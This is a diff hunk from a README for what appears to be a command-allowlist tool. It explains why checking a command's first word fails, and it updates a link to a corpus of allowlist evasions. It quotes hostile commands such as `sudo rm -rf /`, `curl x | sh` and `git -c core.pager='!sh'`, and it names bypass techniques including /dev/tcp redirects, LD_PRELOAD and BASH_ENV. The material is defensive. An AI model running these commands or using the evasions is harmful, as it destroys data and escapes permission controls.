@@ -295,7 +295,7 @@ name. `sudo rm -rf /` is an `rm`. `bash -c "curl x | sh"` is not a `bash`. `xarg
 whose arguments nobody can predict. `find -exec` runs a program per file. `git -c core.pager='!sh'`
 is arbitrary code execution wearing a `git log`.
 
-[`test/bypass.test.ts`](https://github.com/leastgrant/leastgrant/blob/main/test/bypass.test.ts) is a corpus of 46 real allowlist evasions — separators,
+[`corpus/bypasses.json`](https://github.com/leastgrant/leastgrant/blob/main/corpus/bypasses.json) is a corpus of 88 real allowlist evasions — separators,
 command substitution, backticks, process substitution, ANSI-C quoting, `/dev/tcp`
 redirects, `LD_PRELOAD`, `BASH_ENV`, `env` and `git -c` wrappers, path traversal, and
 `..` stepped off the far end of a symlink. Each one is
